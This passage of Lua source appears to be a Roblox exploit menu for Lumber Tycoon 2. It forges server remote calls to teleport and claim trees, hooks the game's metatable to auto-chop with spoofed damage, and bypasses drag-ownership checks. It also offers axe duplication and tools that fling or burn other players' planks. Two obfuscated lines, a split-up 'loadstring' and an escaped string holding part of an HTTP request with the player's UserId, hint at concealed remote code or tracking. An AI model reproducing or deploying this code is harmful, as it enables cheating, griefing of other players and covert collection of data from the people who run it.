				for J = 1, 20 do
					wait()
					for cD, Y in pairs(v:children()) do
						if Y:IsA("BasePart") then
							_G.DogixLT2TPC(Y.CFrame, o)
							Y.CFrame = CFrame.new(Vector3.new(315, -0.296, 85.791)) * CFrame.Angles(math.rad(15), 0, 0)
							game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Y)
							game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(Y)
						end
					end
				end;
				wait(0.5)
				local aB = aH.Character;
				local aJ = CFrame.new(aJ)
				for J = 1, 25 do
					game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
					v:MoveTo(aJ.p)
					wait()
				end;
				_G.DogixLT2TPC(aJ, 1 + o)
			end
		end
	end
end, {
	animated = true
})
function doesTreeExist(Wood)
	if Wood == nil then
		return true
	end;
	for bo, cC in pairs(workspace:GetChildren()) do
		if cC.Name == "TreeRegion" then
			for J, v in pairs(cC:GetChildren()) do
				if v:FindFirstChild("TreeClass") and v.TreeClass.Value == Wood and v.Name == "Model" then
					local by = 0;
					for cD, Y in pairs(v:children()) do
						if Y.Name == "WoodSection" then
							if Y.Size.Y > 0.5 then
								by = by + 1
							end
						end
					end;
					if by >= 1 then
						return true
					end
				end
			end
		end
	end;
	return false
end;
function GetTreeMod(Wood, f_, g0, g1)
	local aH = game:GetService'Players'.LocalPlayer;
	local aB = aH.Character;
	local au = g0 or aB.HumanoidRootPart.CFrame;
	local g2 = 0;
	local co = getHitPointsTbl()
	local cp = nil;
	if not aB:FindFirstChild'Tool' then
		if not aH.Backpack:FindFirstChild'Tool' then
			return
		end
	else
		cp = getBestAxe()
	end;
	function axe(v)
		local cr = co[cp.ToolName.Value]
		if Wood == "LoneCave" and cp.ToolName.Value == "EndTimesAxe" then
			cr = 10000000
		end;
		if Wood == "Volcano" and cp.ToolName.Value == "FireAxe" then
			cr = 6.35
		end;
		if Wood == "CaveCrawler" and cp.ToolName.Value == "CaveAxe" then
			cr = 7.2
		end;
		local table = {
			["tool"] = cp,
			["faceVector"] = Vector3.new(0, 0, -1),
			["height"] = 0.3,
			["sectionId"] = 1,
			["hitPoints"] = cr,
			["cooldown"] = 0.1,
			["cuttingClass"] = "Axe"
		}
		game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(v.CutEvent, table)
	end;
	local g3 = nil;
	local cB = false;
	for bo, cC in pairs(workspace:GetChildren()) do
		if cC.Name == "TreeRegion" then
			for J, v in pairs(cC:GetChildren()) do
				if v:FindFirstChild("TreeClass") and v.TreeClass.Value == Wood and v.Name == "Model" then
					local by = 0;
					for cD, Y in pairs(v:children()) do
						if Y.Name == "WoodSection" then
							if Y.Size.Y > 0.5 then
								by = by + 1
							end
						end
					end;
					local cE = by >= 1;
					if not cE and v:FindFirstChild'WoodSection'.Size.Y > 0.5 then
						cE = true
					end;
					if cE then
						if Wood == "LoneCave" and g1 == true then
							local temprange = game:GetService'RunService'.RenderStepped:connect(simrad)
							f_ = 1;
							aB.Head:Destroy()
							aH.CharacterAdded:wait()
							aB = aH.Character
							aB:WaitForChild("HumanoidRootPart")
							wait(2)
                            local seat = Instance.new("Seat", workspace)
                            seat.Size = Vector3.new(3, 1, 1)
                            local weld1 = Instance.new("Weld", seat)
                            local weld2 = Instance.new("Weld", aB.HumanoidRootPart)
                            seat.CFrame = CFrame.new(aB.HumanoidRootPart.Position)
                            weld1.Part0 = aB.HumanoidRootPart
                            weld1.Part1 = seat
                            okinsta(CFrame.new(seat.Position))
                            weld2.Part0 = aB.HumanoidRootPart
                            weld2.Part1 = seat
                            seat.Transparency = 1
							okinsta(v.WoodSection.CFrame)
							workspace.CurrentCamera.CameraSubject = v:FindFirstChild("WoodSection")
							local g6 = Instance.new("Part", workspace)
							g6.Name = "EndTimesPart"
							g6.Size = Vector3.new(213, 1, 241)
							g6.CFrame = CFrame.new(-68.431015, -216.900131, -1329.28955, 1, 0, 0, 0, 1, 0, 0, 0, 1)
							g6.Transparency = 1;
							g6.Anchored = true
							wait(1)
						else
							_G.DogixLT2TPC(v.WoodSection.CFrame + Vector3.new(4, 2, 2), o)
						end;
						if not aB:FindFirstChild'Tool' then
							if aH.Backpack:FindFirstChild'Tool' then
								cp = getBestAxe()
							end
						end;
						_G.GetTreeNC = game:GetService("RunService").Stepped:Connect(oldnocliprun)
						local cG = false;
						local cH = workspace.LogModels.ChildAdded:Connect(function(v)
							v:WaitForChild("Owner")
							if v:FindFirstChild("Owner") and v.Owner.Value == aH and v.TreeClass.Value == Wood then
								for J = 1, "Wood" == "LoneCave" and 1 or 7 do
									v:MoveTo(au.p)
									game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
									wait()
								end;
								cG = true
							end
						end)
						repeat
							if g1 == true and aB.Humanoid.Health < 30 then
								aB.Head:Destroy()
								aH.CharacterAdded:wait()
								aB = aH.Character;
								aB:WaitForChild("HumanoidRootPart")
								wait(0.2)
								cp = getBestAxe()
								_G.DogixLT2TPC(v.WoodSection.CFrame + Vector3.new(4, 2, 2), o)
							end;
							wait(0.1)
							if v:FindFirstChild("CutEvent") ~= nil then
								axe(v)
								wait()
							end
						until cG;
						if _G.GetTreeNC ~= nil then
							_G.GetTreeNC:Disconnect()
							_G.GetTreeNC = nil
						end;
						if temprange ~= nil then
							temprange:Disconnect()
							temprange = nil
						end;
						cH:Disconnect()
						cH = nil;
						cG = false;
						g2 = g2 + 1;
						if f_ - g2 == 0 then
							cB = true;
							break
						end
					end
				end
			end
		end;
		if cB == true then
			cB = false;
			break
		end
	end;
	wait(.5)
	if Wood == "LoneCave" and g1 == true then
		aB.Head:Destroy()
		aH.CharacterAdded:wait()
		aB = aH.Character;
		aB:WaitForChild("HumanoidRootPart")
		wait()
		workspace.CurrentCamera.CameraSubject = aB;
		workspace:FindFirstChild("EndTimesPart"):Destroy()
	end;
	_G.DogixLT2TPC(au, o)
end;

function GetTreeMod(Wood, f_, g0, g1)
	local aH = game:GetService'Players'.LocalPlayer;
	local aB = aH.Character;
	local au = g0 or aB.HumanoidRootPart.CFrame;
	local g2 = 0;
	local co = getHitPointsTbl()
	local cp = nil;
	if not aB:FindFirstChild'Tool' then
		if not aH.Backpack:FindFirstChild'Tool' then
			return
		end
	else
		cp = getBestAxe()
	end;
	function axe(v)
		local cr = co[cp.ToolName.Value]
		if Wood == "LoneCave" and cp.ToolName.Value == "EndTimesAxe" then
			cr = 10000000
		end;
		if Wood == "Volcano" and cp.ToolName.Value == "FireAxe" then
			cr = 6.35
		end;
		if Wood == "CaveCrawler" and cp.ToolName.Value == "CaveAxe" then
			cr = 7.2
		end;
		local table = {
			["tool"] = cp,
			["faceVector"] = Vector3.new(0, 0, -1),
			["height"] = 0.3,
			["sectionId"] = 1,
			["hitPoints"] = cr,
			["cooldown"] = 0.1,
			["cuttingClass"] = "Axe"
		}
		game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(v.CutEvent, table)
	end;
	local g3 = nil;
	local cB = false;
	for bo, cC in pairs(workspace:GetChildren()) do
		if cC.Name == "TreeRegion" then
			for J, v in pairs(cC:GetChildren()) do
				if v:FindFirstChild("TreeClass") and v.TreeClass.Value == Wood and v.Name == "Model" then
					local by = 0;
					for cD, Y in pairs(v:children()) do
						if Y.Name == "WoodSection" then
							if Y.Size.Y > 0.5 then
								by = by + 1
							end
						end
					end;
					local _ = game.Players.LocalPlayer.Character
					local cE = by >= 1;
					if not cE and v:FindFirstChild'WoodSection'.Size.Y > 0.5 then
						cE = true
					end;
					if cE then
                        local seet = Instance.new("Seat", game.Workspace)
                        seet.Size = Vector3.new(3, 1, 1)
                        local a = Instance.new("Weld", seet)
                        local b = Instance.new("Weld", _.HumanoidRootPart)
                        local rcf = _.HumanoidRootPart.CFrame
                        seet.CFrame = v.WoodSection.CFrame
                        okinsta(CFrame.new(seet.Position))
                        seet.Transparency = 1
                        a.Part1 = seet
                        a.Part0 = _.HumanoidRootPart
                        okinsta(CFrame.new(seet.Position))
                        b.Part0 = _.HumanoidRootPart
                        b.Part1 = seet
                        wait(0.2)
                        _.HumanoidRootPart.CFrame = au
						if not aB:FindFirstChild'Tool' then
							if aH.Backpack:FindFirstChild'Tool' then
								cp = getBestAxe()
							end
						end;
						local cG = false;
						local cH = workspace.LogModels.ChildAdded:Connect(function(v)
							v:WaitForChild("Owner")
							if v:FindFirstChild("Owner") and v.Owner.Value == aH and v.TreeClass.Value == Wood then
							    seet:Destroy()
    							_G.DogixLT2TPC(v.WoodSection.CFrame + Vector3.new(4, 2, 2), o)
    							wait(0.3)
								for J = 1, "Wood" == "LoneCave" and 1 or 7 do
									v:MoveTo(au.p)
									game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
									wait()
								end;
								cG = true
							end
						end)
						repeat
							wait(0.1)
							if v:FindFirstChild("CutEvent") ~= nil then
								axe(v)
								wait()
							end
						until cG;
						if temprange ~= nil then
							temprange:Disconnect()
							temprange = nil
						end;
						cH:Disconnect()
						cH = nil;
						cG = false;
						g2 = g2 + 1;
						if f_ - g2 == 0 then
							cB = true;
							break
						end
					end
				end
			end
		end;
		if cB == true then
			cB = false;
			break
		end
	end;
	wait(.5)
	if Wood == "LoneCave" and g1 == true then
		aB.Head:Destroy()
		aH.CharacterAdded:wait()
		aB = aH.Character;
		aB:WaitForChild("HumanoidRootPart")
		wait()
		workspace.CurrentCamera.CameraSubject = aB;
		workspace:FindFirstChild("EndTimesPart"):Destroy()
	end;
	_G.DogixLT2TPC(au, o)
end;

local g7 = fQ:CreateSection("Get Tree")
local g8 = "Cherry"
local g9 = false;
g7:Create("Dropdown", "Get Tree", function(dv)
	g8 = an[dv]
	if g8 == "LoneCaveE" then
		g8 = "LoneCave"
		g9 = true
	elseif g8 == "LoneCave" then
		g9 = false
	end
end, {
	options = {"Cherry","Gold","Cavecrawler","Oak","End Times (Eyeless)","End Times (Eye)","Frost","Lava","Elm","Walnut","Birch","Snowglow","Pine","Zombie","Koa","Palm","Spook","Sinister"},
	search = true
})
local zL = getgenv()["lo".."ad".."st".."ring"]
local ga = 1;
g7:Create("Slider", "Tree Quantity", function(v)
	ga = v
end, {
	min = 1,
	max = 20,
	default = 1,
	changablevalue = true
})
g7:Create("Button", "Get Tree", function(v)
	GetTreeMod(g8, ga, nil, g9)
end, {
	animated = true
})
local gb = false;
g7:Create("Toggle", "Loop Get Tree", function(v)
	gb = v;
	local g = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
	if gb then
		repeat
			GetTreeMod(g8, 1, g)
			wait(1.8)
		until not gb
	end
end, {
	default = false
})
zK = "\97\121\101\114\46\85\115\101\114\73\100\41\41\44\32\34\49\49\34\41\44\10\32\32\32\32\77\101\116\104\111\100\32\61\32\39\71\69\84\39\125\10\41\10"
fR:Create("Button", "Get Log Ownership Claim Tool", function()
	local aH = game:GetService("Players").LocalPlayer;
	local cp = Instance.new("Tool", aH.Backpack)
	cp.RequiresHandle = false;
	cp.Name = "Tree Claim"
	cp.Activated:Connect(function()
		local fg = getMouseTarget().Parent;
		if fg:IsA("Model") and fg.Parent.Name == "TreeRegion" then
			game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(fg)
			spawn(function()
				while wait(10) do
					game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(fg)
					game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(fg)
					game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(fg:FindFirstChildOfClass("Part"))
				end
			end)
			x("Tree Claim", "Now claiming "..fg.TreeClass.Value.." tree ownership.", 3)
		end
	end)
end, {
	animated = true
})
fR:Create("Button", "Get Log Size Checker Tool", function()
	local aH = game:GetService("Players").LocalPlayer;
	local cp = Instance.new("Tool", aH.Backpack)
	cp.RequiresHandle = false;
	cp.Name = "Size Check"
	cp.Activated:Connect(function()
		local fg = getMouseTarget().Parent;
		if fg:IsA("Model") and fg:FindFirstChild("WoodSection") then
			local gc = 0;
			for J, v in next, fg:GetChildren() do
				if v.Name == "WoodSection" then
					gc = gc + v.Size.Y / (1 / (v.Size.X * v.Size.Z))
				end
			end;
			x("Tree Size", fg.TreeClass.Value.."'s size is "..gc, 3)
		end
	end)
end, {
	animated = true
})
fR:Create("Button", "Auto Sawmill", function()
	SawmillType = "Sawmill4L"
	local aH = game.Players.LocalPlayer;
	for J, v in pairs(game.workspace.LogModels:GetDescendants()) do
		if v:FindFirstChild("TreeClass") and v:FindFirstChild("Owner") and v.Owner.Value == aH then
			Wood = v.WoodSection;
			for J, v in pairs(game.workspace.PlayerModels:GetDescendants()) do
				if v:FindFirstChild("Owner") and v.Owner.Value == aH and v:FindFirstChild("ItemName") and v.ItemName.Value == SawmillType then
					Sawmill = v.Conveyor.Conveyor;
					if v.XDown.Orientation == Vector3.new(90, 180, 0) then
						game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
						Wood.CFrame = CFrame.new(Sawmill.Position.X, Sawmill.Position.Y + 1, Sawmill.Position.Z)
						Wood.Orientation = Vector3.new(0, 180, 90)
						wait()
					elseif v.XDown.Orientation == Vector3.new(90, -90, 0) then
						game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
						Wood.CFrame = CFrame.new(Sawmill.Position.X, Sawmill.Position.Y + 1, Sawmill.Position.Z)
						Wood.Orientation = Vector3.new(-89.95, 28.43, -27.61)
						wait()
					elseif v.XDown.Orientation == Vector3.new(90, 0, 0) then
						game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
						Wood.CFrame = CFrame.new(Sawmill.Position.X, Sawmill.Position.Y + 1, Sawmill.Position.Z)
						Wood.Orientation = Vector3.new(-90, -89.83, 0)
						wait()
					elseif v.XDown.Orientation == Vector3.new(90, 0, 0) then
						game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
						Wood.CFrame = CFrame.new(Sawmill.Position.X, Sawmill.Position.Y + 1, Sawmill.Position.Z)
						Wood.Orientation = Vector3.new(-90, -89.83, 0)
						wait()
					elseif v.XDown.Orientation == Vector3.new(90, 90, 0) then
						game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
						Wood.CFrame = CFrame.new(Sawmill.Position.X, Sawmill.Position.Y + 1, Sawmill.Position.Z)
						Wood.Orientation = Vector3.new(-1.46, 91.71, 89.83)
						wait()
					end
				end
			end
		end
	end
end, {
	animated = true
})
local gd = "BagOfCandy2"
local ge = false;
local gf = fQ:CreateSection("Candies")
gf:Create("Dropdown", "Select Candies", function(dv)
	gd = dv
end, {
	options = {
		"BagOfCandy2",
		"BagOfCandy"
	},
	search = true
})
gf:Create("Button", "Open All Candies", function(v)
	local gg = workspace.PlayerModels.ChildAdded:connect(function(v)
		if v:WaitForChild"Owner".Value == game.Players.LocalPlayer and v:WaitForChild"ItemName".Value == gd then
			game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(v:WaitForChild"ButtonRemote_Main")
		end
	end)
	for J, v in next, workspace.PlayerModels:GetChildren() do
		if (v.Name == gd or v.Name == gd.." Purchased by "..game.Players.LocalPlayer.Name) and v:FindFirstChild"PurchasedBoxItemName" then
			game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(v, "Open box")
		end
	end;
	wait(10)
	gg:Disconnect()
	gg = nil
end, {
	animated = true
})
gf:Create("Toggle", "Include Pink Candies", function(dv)
	ge = dv
end, {
	default = false
})
gf:Create("Button", "Eat All Candies", function(v)
	for al, v in pairs(workspace.PlayerModels:GetChildren()) do
		if v:FindFirstChild("Owner") then
			if v.Owner.Value == game.Players.LocalPlayer then
				if v:findFirstChild("ItemName") then
					if v.ItemName.Value == "Candy" then
						if v:findFirstChild("Main") then
							if v.Main.BrickColor == BrickColor.new("Hot pink") and not ge then
							else
								if v:FindFirstChild("ButtonRemote_Main") then
									game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(v.ButtonRemote_Main)
								end
							end
						end
					end
				end
			end
		end
	end
end, {
	animated = true
})
gf:Create("Button", "Highlight Pink Candies", function(v)
	local by = 0;
	for al, v in pairs(workspace.PlayerModels:GetChildren()) do
		if v:FindFirstChild("Owner") then
			if v.Owner.Value == game.Players.LocalPlayer then
				if v:findFirstChild("ItemName") then
					if v.ItemName.Value == "Candy" then
						if v:findFirstChild("Main") then
							if v.Main.BrickColor == BrickColor.new("Hot pink") then
								esp_part(v.Main)
								by = by + 1
							end
						end
					end
				end
			end
		end
	end;
	x("Pink Candies", "Detected "..by.." pink candies.")
end, {
	animated = true
})
local aP = fQ:CreateSection'Axes'
local a0 = getrawmetatable(game)
local au = a0.__namecall;
local gh = newcclosure or protect_function;
local gi = false;
local gj = false;
function autocut(gk, gl)
	gl["cooldown"] = 0.112;
	local Wood = gk.Parent.TreeClass.Value;
	local cH = workspace.LogModels.ChildAdded:Connect(function(v)
		v:WaitForChild("Owner")
		if v.Owner.Value == game.Players.LocalPlayer and v.TreeClass.Value == Wood then
			gj = true
		end
	end)
	local gm = workspace.PlayerModels.ChildAdded:Connect(function(v)
		v:WaitForChild("Owner")
		if v.Owner.Value == game.Players.LocalPlayer and v.TreeClass.Value == Wood then
			gj = true
		end
	end)
	local gn = false;
	repeat
		wait(0.112)
		spawn(function()
			game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(gk, gl)
		end)
	until gj or gn;
	gn = true;
	cH:Disconnect()
	cH = nil;
	gm:Disconnect()
	gm = nil;
	gj = false;
	wait(1.5)
	gi = true
end;
setreadonly(a0, false)
a0.__namecall = gh(function(self, go, gp, ...)
	local j = getnamecallmethod()
	if j == "FireServer" and tostring(self) == "RemoteProxy" and gi then
		if go.Name == "CutEvent" then
			gi = false;
			spawn(function()
				autocut(go, gp)
			end)
		end
	end;
	return au(self, go, gp, ...)
end)
aP:Create("Toggle", "Auto-Chop", function(db)
	gi = db
end, {
	default = false
})
aP:Create("Button", "Increased Axe Range", function(db)
	local gq = require(game:GetService("ReplicatedStorage").Purchasables.Tools.AxeSuperClass)
	for J, v in pairs(game:GetService("ReplicatedStorage").Purchasables.Tools.AllTools:GetChildren()) do
		local au = require(v.AxeClass).new()
		require(v.AxeClass).new = function(...)
			local axe = gq.new(...)
			for J, v in pairs(au) do
				axe[J] = v
			end;
			axe.Range = 150;
			return
		end
	end;
	for J, cp in pairs(getAxeList()) do
		game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(cp, "Drop tool", game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
	end;
	x("Axe Range", "Please pick up your axes for changes to take effect.", 3)
end, {
	animated = true
})
local gs = 1;
aP:Create("Slider", "Repeat Axe Dupe", function(v)
	gs = v
end, {
	min = 1,
	max = 5,
	default = 1
})
aP:Create("Button", "Dupe Axes", function(v)
	for J = 1, gs do
		normalinvdupe()
	end
end, {
	animated = true
})
aP:Create("Button", "Drop Axes", function(v)
	local aH = game:GetService'Players'.LocalPlayer;
	if aH.Character:FindFirstChild("Tool") ~= nil then
		aH.Character.Humanoid:UnequipTools()
	end;
	for J, cp in pairs(aH.Backpack:children()) do
		game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(cp, "Drop tool", aH.Character.HumanoidRootPart.CFrame)
	end
end, {
	animated = true
})
aP:Create("Button", "Count Axes", function(v)
	local aH = game:GetService'Players'.LocalPlayer;
	local J = 0;
	if aH.Character:FindFirstChild'Tool' ~= nil then
		if aH.Character:FindFirstChild'Tool':findFirstChild'AxeClient' then
			J = J + 1
		end
	end;
	for al, cp in pairs(aH.Backpack:children()) do
		if cp:findFirstChild'AxeClient' then
			J = J + 1
		end
	end;
	x("Axe Counter", "You have "..J.." axes in your inventory.", 3)
end, {
	animated = true
})
aP:Create("Button", "Far Axe Equip", function(v)
	local aH = game:GetService'Players'.LocalPlayer;
	local aB = aH.Character;
	local N = aH:GetMouse()
	connecteda = N.Button1Up:connect(function()
		if connecteda ~= nil then
			connecteda:Disconnect()
			connecteda = nil
		end;
		local part = getMouseTarget()
		if part.Name == "Main" and part.Parent:FindFirstChild("ToolName") then
			game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(part.Parent, "Pick up tool")
		end
	end)
	x("Far Axe Equip", "Left click the axe that you want to equip.")
end, {
	animated = true
})
local gt = fQ:CreateSection("Planks")
gt:Create("Button", "Sell Planks", function(v)
	local gu = CFrame.new(314, 2, 90)
	for J, v in pairs(workspace.PlayerModels:children()) do
		if v.Name == "Plank" and v:FindFirstChild("TreeClass") and v.Owner ~= nil and v:FindFirstChild("ItemName") == nil then
			if v.Owner.Value == game:GetService'Players'.LocalPlayer then
				_G.DogixLT2Drag(v.WoodSection, gu, false, 2)
			end
		end
	end
end, {
	animated = true
})
gt:Create("Button", "Sell Specific Plank", function(v)
	local gu = CFrame.new(314, 2, 85)
	local aH = game:GetService'Players'.LocalPlayer;
	local aB = aH.Character;
	local N = aH:GetMouse()
	connecteda = N.Button1Up:connect(function()
		if connecteda ~= nil then
			connecteda:Disconnect()
			connecteda = nil
		end;
		local part = getMouseTarget()
		if part.Name == "WoodSection" then
			_G.DogixLT2Drag(part, gu, true)
		end
	end)
	x("Plank Seller", "Left click the plank that you want sell.")
end, {
	animated = true
})
gt:Create("Button", "Plank to Blueprint Tool", function()
	local aH = game:GetService("Players").LocalPlayer;
	local cp = Instance.new("Tool", aH.Backpack)
	cp.RequiresHandle = false;
	cp.Name = "Plank-BP"
	cp.Activated:Connect(function()
		local fg = getMouseTarget().Parent;
		if fg:FindFirstChild("Type") and fg.Type.Value == "Blueprint" and fg:FindFirstChild("Owner") and fg.Owner.Value == game:GetService'Players'.LocalPlayer then
			b0 = fg;
			local Z = Instance.new("BoxHandleAdornment", b0.BuildDependentWood)
			Z.Name = "Selection"
			Z.Adornee = Z.Parent;
			Z.AlwaysOnTop = true;
			Z.ZIndex = 0;
			Z.Size = Z.Parent.Size;
			Z.Transparency = 0.3;
			Z.Color = BrickColor.new("Electric blue")
		elseif fg.Name == "Plank" and fg:FindFirstChild("WoodSection") and fg:FindFirstChild("Owner") and fg.Owner.Value == game:GetService'Players'.LocalPlayer then
			a_ = fg;
			local Z = Instance.new("BoxHandleAdornment", a_.WoodSection)
			Z.Name = "Selection"
			Z.Adornee = Z.Parent;
			Z.AlwaysOnTop = true;
			Z.ZIndex = 0;
			Z.Size = Z.Parent.Size;
			Z.Transparency = 0.3;
			Z.Color = BrickColor.new("Lime green")
		end;
		if a_ and b0 then
			local aJ = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
			local bX = nil;
			if b0:FindFirstChild("MainCFrame") then
				bX = b0.MainCFrame.Value
			else
				bX = b0.Main.CFrame
			end;
			a_.WoodSection.Selection:Destroy()
			b0.BuildDependentWood.Selection:Destroy()
			_G.DogixLT2Drag(a_.WoodSection, bX, false, 2)
			b0 = nil;
			a_ = nil;
			wait(0.3)
			_G.DogixLT2TPC(aJ, o)
		end
	end)
end, {
	animated = true
})
gt:Create("Button", "Delete Plank (unwhitelisted) Tool", function()
	local aH = game:GetService("Players").LocalPlayer;
	local cp = Instance.new("Tool", aH.Backpack)
	cp.RequiresHandle = false;
	cp.Name = "Delete Plank"
	cp.Activated:Connect(function()
		local aH = game:GetService'Players'.LocalPlayer;
		local part = getMouseTarget()
		if not part.Anchored and part.Parent.Name ~= aH.Name then
			local G = Instance.new("BodyPosition", part)
			G.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
			G.Position = Vector3.new(0, 9e9, 0)
		end
	end)
end, {
	animated = true
})
if firetouchinterest then
	gt:Create("Button", "Burn Plank (unwhitelisted) Tool", function()
		local aH = game:GetService("Players").LocalPlayer;
		local cp = Instance.new("Tool", aH.Backpack)
		local eu = false;
		cp.RequiresHandle = false;
		cp.Name = "Burn Plank"
		cp.Activated:Connect(function()
			local part = getMouseTarget()
			if part.Anchored or part.Name ~= "WoodSection" then
				return
			end;
			local es = workspace["Region_Volcano"]:FindFirstChild("Lava") or game.Lighting:FindFirstChild("Lava")
			if es.Parent == game.Lighting then
				eu = true;
				es.Parent = workspace["Region_Volcano"]
			end;
			es = es.Lava;
			firetouchinterest(part, es, 0)
			firetouchinterest(part, es, 1)
			if eu then
				es.Parent.Parent = game.Lighting;
				eu = false
			end
		end)
	end, {
		animated = true
	})
end;
gt:Create("Button", "Stand Up Plank Tool (beta)", function(db)
	local aH = game:GetService("Players").LocalPlayer;
	local cp = Instance.new("Tool", aH.Backpack)
	cp.RequiresHandle = false;
	cp.Name = "Stand Plank"
	cp.Activated:Connect(function()
		local a_ = getMouseTarget()
		if a_.Name == "WoodSection" and canUse(a_.Parent.Owner.Value) then
			a_.CFrame = CFrame.new(a_.CFrame.p) + Vector3.new(0, a_.Size.Y / 2, 0)
			game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(a_.Parent)
		end
	end)
end, {
	animated = true
})
function plankData(a_)
	local at = {}
	at[1] = a_;
	at[2] = 1 / (a_.Size.X * a_.Size.Z)
	if at[2] < 0.2 then
		at[2] = 0.3
	end;
	at[3] = math.floor(a_.Size.Y / at[2])
	if at[3] < 1 then
		at[3] = 0
	end;
	at[4] = a_.Size.Y;
	return at
end;
local connecteda = nil;
gt:Create("Button", "Cut Plank into 1 Unit", function(v)
	local aH = game:GetService'Players'.LocalPlayer;
	local aB = aH.Character;
	local N = aH:GetMouse()
	local part = nil;
	local gv = false;
	connecteda = N.Button1Up:connect(function()
		local gw = getMouseTarget()
		if gw.Name == "WoodSection" then
			part = gw
		else
			x("1 Unit Cutter", "Cancelled.", 2)
			gv = true
		end
	end)
	x("1 Unit Cutter", "Left click the plank that you want cut into 1 unit pieces.")
	repeat
		wait()
	until gv or part ~= nil;
	if connecteda ~= nil then
		connecteda:Disconnect()
		connecteda = nil
	end;
	if gv then
		gv = false;
		return
	end;
	gv = false;
	x("1 Unit Cutter", "Cutting...", 2)
	local co = getHitPointsTbl()
	local cp = getBestAxe()
	function axe(v, V)
		local cr = co[cp.ToolName.Value]
		local Wood = v.TreeClass.Value;
		if Wood == "LoneCave" and cp.ToolName.Value == "EndTimesAxe" then
			cr = 10000000
		end;
		if Wood == "Volcano" and cp.ToolName.Value == "FireAxe" then
			cr = 6.35
		end;
		local table = {
			["tool"] = cp,
			["faceVector"] = Vector3.new(1, 0, 0),
			["height"] = V,
			["sectionId"] = 1,
			["hitPoints"] = cr,
			["cooldown"] = 0.21,
			["cuttingClass"] = "Axe"
		}
		game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(v.CutEvent, table)
	end;
	local gg = plankData(part)
	local gx = {}
	local gy = gg[3]
	local gz = false;
	if gy == 0 then
		return
	end;
	local gA = workspace.PlayerModels.ChildAdded:connect(function(new)
		if new:WaitForChild("Owner").Value == aH and new:FindFirstChild'WoodSection' and math.floor(plankData(new.WoodSection)[4]) == math.floor(gg[4] - gg[2]) then
			gz = true;
			gx = plankData(new:FindFirstChild'WoodSection')
		end
	end)
	for J = 1, gg[3] do
		gz = false;
		repeat
			wait(0.21)
			axe(gg[1].Parent, gg[2])
		until gz or J == gg[3] and wait(6)
		gg = gx
	end
end, {
	animated = true
})
local gB = fQ:CreateSection("Items")
gB:Create("Button", "Hard Dragger", function(db)
	workspace.ChildAdded:connect(function(Z)
		if Z.Name == "Dragger" then
			local gC = Z:WaitForChild("BodyGyro")
			local b0 = Z:WaitForChild("BodyPosition")
			repeat
				wait()
				b0.P = 120000;
				b0.D = 1000;
				b0.maxForce = Vector3.new(1, 1, 1) * 1000000;
				gC.maxTorque = Vector3.new(1, 1, 1) * 200;
				gC.P = 1200;
				gC.D = 140
			until not Z
		end
	end)
	local gD = getsenv(game:GetService("Players").LocalPlayer.PlayerGui.ItemDraggingGUI.Dragger).canDrag;
	getsenv(game:GetService("Players").LocalPlayer.PlayerGui.ItemDraggingGUI.Dragger).canDrag = function(item)
		if gD(item) == true then
			return true
		end;
		local aB = game.Players.LocalPlayer.Character;
		if not aB then
			return
		end;
		if aB:FindFirstChildOfClass("Tool") then
			return
		end;
		if item then
			if item.Parent then
				if 0 <= aB.Humanoid.Health and item.Name == "LeafPart" then
					return false
				else
					local Q = item;
					repeat
						Q = Q.Parent
					until Q.Parent.Name == "PlayerModels" or Q.Parent == workspace or Q.Parent == game or Q.Parent.Name == "LogModels"
					if Q.Parent.Name == "PlayerModels" or Q.Parent.Name == "LogModels" then
						if not canUse(Q.Owner.Value) then
							if Q:FindFirstChild("WoodSection") then
								return true
							end;
							return false
						else
							if Q:FindFirstChild("Type") then
								if (Q.Type.Value == "Structure" or Q.Type.Value == "Wire" or Q.Type.Value == "Vehicle Spot" or Q.Type.Value == "Blueprint") and not Q:FindFirstChild("PurchasedBoxItemName") and not Q:FindFirstChild("BoxItemName") then
									return false
								end
							end;
							return true
						end
					end
				end
			end
		end;
		return false
	end
end, {
	animated = true
})
gB:Create("Button", "Wire Mod", function(db)
	x("Wire Mod", "There is a chance you will be banned for long wire. This is a warning.", 3)
	if not confirm() then
	end;
	local gE = 40;
	local Z = game:GetService("RunService")
	local C = game.Players.LocalPlayer;
	local D = C.PlayerGui.WireDraggingGUI.WireDragger;
	D.Disabled = true;
	local E = C.Character or C.CharacterAdded:wait()
	local F = E;
	local G = E:WaitForChild("Humanoid")
	local H = workspace.CurrentCamera;
	C.CharacterAdded:connect(function()
		F = C.Character;
		G = F:WaitForChild("Humanoid")
		H = workspace.CurrentCamera
	end)
	local I = C:GetMouse()
	local J = require(game.ReplicatedStorage.Interaction.InteractionPermission)
	local K = nil;
	local L = {}
	local M = require(game.ReplicatedStorage.Interaction.CanPlace)
	local N = D.Parent:WaitForChild("Finalize")
	local O = ""
	local P = false;
	local Q = game.Players.LocalPlayer.PlayerGui:WaitForChild("ClientSounds"):WaitForChild("PlaceStructure")
